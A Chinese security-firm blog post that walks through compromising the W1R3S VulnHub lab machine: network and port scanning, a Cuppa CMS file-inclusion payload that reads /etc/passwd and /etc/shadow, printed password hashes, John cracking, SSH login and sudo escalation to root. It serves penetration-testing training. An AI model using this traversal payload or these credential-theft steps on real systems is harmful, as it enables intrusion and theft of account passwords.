---
title: 靶机练习-W1R3S
url: https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652501613&idx=1&sn=3bc757a349e92d20ddbc94f0fa892c64&chksm=f25855dec52fdcc8f10afbb1f034594ee87261f6197216084474f3b0e6c984e34c832a300d63&scene=58&subscene=0#rd
source: 雷神众测
date: 2023-02-18
fetch_date: 2025-10-04T07:23:08.311040
---

# 靶机练习-W1R3S

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibvAUFMRbgicQ4pYQHgPvCWXp3cWee2uqfgX4ibmWjAic4k27K7SgMabO2Q/0?wx_fmt=jpeg)

# 靶机练习-W1R3S

原创

s1mp1e

雷神众测

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibZqNFjgoic3gMD9gB0WV6rcHE3D6LicvUcVVd66anma9Fib8Dic4X8cVK2Q/640?wx_fmt=png)

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfRGPiboDKmcUcCTu564SRVBNIQClTEJEQQZsSCNlEzIlLibq3jETbGYcRsJarudKREXWZTwjxjKgSPic11NhVWKrAZ/640?wx_fmt=svg)

靶机简介

Name: W1R3S: 1.0.1
Difficulty:Beginner/Intermediate
Flag : 1 Flag located in /root directory
靶机下载地址：https://www.vulnhub.com/entry/w1r3s-101,220/

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfRGPiboDKmcUcCTu564SRVBNIQClTEJEQQZsSCNlEzIlLibq3jETbGYcRsJarudKREXWZTwjxjKgSPic11NhVWKrAZ/640?wx_fmt=svg)

实验环境

攻击机：kali(192.168.11.166)
靶机：Linux，IP自动获取
攻击机与靶机都使用net网络连接，在同一网段下

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfRGPiboDKmcUcCTu564SRVBNIQClTEJEQQZsSCNlEzIlLibq3jETbGYcRsJarudKREXWZTwjxjKgSPic11NhVWKrAZ/640?wx_fmt=svg)

渗透测试步骤

1、使用nmap扫描网段，获得靶机IP

```
sudo nmap -sn 192.168.11.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibJnFA9YnNViaofkicZRSicXpJyrxUt5D4TxRgMPhgHmyBEtiaW4WxT0D38A/640?wx_fmt=png)

2、使用masscan扫描目标端口

```
sudo masscan -p1-65535 --rate=10000 192.168.11.165
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibWkxAvD5gfXC41L08UhaI3yJVsQozicepAXFPjlMTDlAtK0vzfqm5mEQ/640?wx_fmt=png)

3、对开放的端口进行探测

```
sudo nmap -sT -sV -O -p 21,22,80,3306 192.168.11.165
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibibL1y9kIJ5Czds3qvOvfJSMXGEWKs51hH7LUekg3oDMTkuRssmBiahAA/640?wx_fmt=png)

可以看到目标有http、mysql、ftp、ssh等服务，Linux系统。

4、先从http服务入手，访问80端口，发现是一个apache的默认页面

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibqzn3KAgo5g0Sxg9676J6A44Prx4oMRVOqp3L0zfia3HyDtkDZKvvaibA/640?wx_fmt=png)

5、扫描目录

```
sudo dirsearch -u http://192.168.11.165/
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibfuFgbgSVKrrtGiaanFnOicaKcJ5UibzomAyw8Eahj78fldsooW7nZ55fQ/640?wx_fmt=png)

发现有一个administrator路径、wordpress、installation这些

6、首先看一下wordpress，发现是一个登录的，输入账号密码尝试一下跳转到一个错误页面，暂时不考虑

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibPJgiaj2Ltywy2ib3jMheGlz9PY9QwyNVBXe2QMiaTOTWvGSKTK4Z3ibceQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibTqgmm1icicD4VGhkLkkY4KvoVcZLpQcuah5s7Ceds9z46yjvbLaHC1yg/640?wx_fmt=png)

7、接着看administrator路径，发现是安装页面，同时发现使用了Cuppa CMS

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibhj0qTAvagbeia3YDtfMemibNoE5nDw1LycA2uJuxVf5x07vBbDulTtFQ/640?wx_fmt=png)

碰到安装页面不建议进一步攻击，万一真给目标重装了后果是很严重的。所以接下来的思路是找Cuppa CMS漏洞

8、使用searchsploit搜索漏洞

```
searchsploit Cuppa
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibKElFQQ2HuwLT1icmsa2oYoTGGarXBZu8P79bCibGicZSUMciaEBeU4ickaw/640?wx_fmt=png)

```
searchsploit -m 25971
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibHbGZfWkBHYicSykVPMUE1LycfFwLtdU5shpic1ConVGa0PUO5K2gIUdQ/640?wx_fmt=png)

发现是一个文件包含漏洞，查看25971.txt文档，看如何利用

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibWiayyxjwwBtL9D663d6LxHwajLG15Dst6Jibnf4d9QcIbY2Q8E7O4fRg/640?wx_fmt=png)

9、拼接漏洞路径访问，确定路径为：

```
http://192.168.11.165/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

但是没有返回结果，尝试了编码、另一种攻击语句，都没有响应内容，最后发现这玩意有问题，不是get请求的参数，而是post请求的参数

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ib6ntDQqeJyTCohCzrqKp5MVgr9bqUtp2PepCBRDIibSK3FdXKhkaAic3w/640?wx_fmt=png)

10、发现可以成功读取shadow文件

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibE6Dyll5KgcEdjZUJykqDqu2vleibhcd0c7FMM1yujJ9SKIQK16ibCZsg/640?wx_fmt=png)

获得如下几个密文：

```
root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
```

11、使用John破解shadow文件中的密文，将上面获得的密文保存为hash.txt

```
john hash.txt --wordlist /usr/share/john/password.lst
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibWibbz9AzicKHeWiabFdFB8ghkhMlqbq0uQ55QyyoN3GluAjAuuiaq5bVoA/640?wx_fmt=png)

成功破解出 w1r3s 用户的密码为 computer

12、目标开放了22端口，尝试使用ssh远程连接

```
ssh w1r3s@192.168.11.165
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibfD6XAkrtu1CmV4cibpKxaszjIyqRibbFYBEFfmuB6zCzjq9dsrfZRdEw/640?wx_fmt=png)

13、提权

```
sudo -l
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibzsqSdXyicDyEFcwZLPC5SFEQOy6m6nh7Uowj1FduviafLobo5EprlFRw/640?wx_fmt=png)

发现当前用户可以sudo任何命令，直接sudo su提权到root

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ib3CNytOUW28OxfF4uCRibIcr5Dicpv4aia0z7UCBKhRlIlcEj3JHiazY4SQ/640?wx_fmt=png)

14、获得flag
在/root目录下获得flag

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibZHuRHQoUXwOhETXrThtXB29YplE9Wfta6URBoU27lTadR3IXyIFU5Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfRGPiboDKmcUcCTu564SRVBNIQClTEJEQQZsSCNlEzIlLibq3jETbGYcRsJarudKREXWZTwjxjKgSPic11NhVWKrAZ/640?wx_fmt=svg)

总结

该靶场的难点在于对Cuppa CMS漏洞的利用，需要自己拼接漏洞路径，要多尝试几次，得到/etc/shadow文件内容之后，对密码进行破解，获得了w1r3s用户的密码，ssh远程连接后，提权的方法比较常规也比较简单。

**安恒信息**

✦

杭州亚运会网络安全服务官方合作伙伴

成都大运会网络信息安全类官方赞助商

武汉军运会、北京一带一路峰会

青岛上合峰会、上海进博会

厦门金砖峰会、G20杭州峰会

支撑单位北京奥运会等近百场国家级

重大活动网络安保支撑单位

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ib9QkeWN4NuGWjeUe7mPC5mdHgQ55NfMK5NYf2uGhzHVK72ZSB4CFcZQ/640?wx_fmt=jpeg)

END

![](https://mmbiz.qpic.cn/mmbiz_gif/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ibJVB0Q2xkJxjOcmTGuenwXzF3exhqpGdDKiaBDpRbthbT9DkVwDH0ibrw/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ib71T5FHVfZUiawVWWelnLQusw5Er3Ir4g1uWlosRnVHXeHBmCWHhXrfg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/HxO8NorP4JVRr0Bc38icVQ5GpTOJsLG7ib6P5SZwoq0JfnUfBUujmhExkpExmx468JrldGTuicaYLdyCkpgYk0EfA/640?wx_fmt=gif)

**长按识别二维码关注我们**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXR4T1FPu3xWeia88A3vf9jricoWSZL9S5lgnSdQiaibu0xaMXwojMqj62dlEG7DNkrNAbMu6quah2YLQ/0?wx_fmt=png)

雷神众测

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXR4T1FPu3xWeia88A3vf9jricoWSZL9S5lgnSdQiaibu0xaMXwojMqj62dlEG7DNkrNAbMu6quah2YLQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过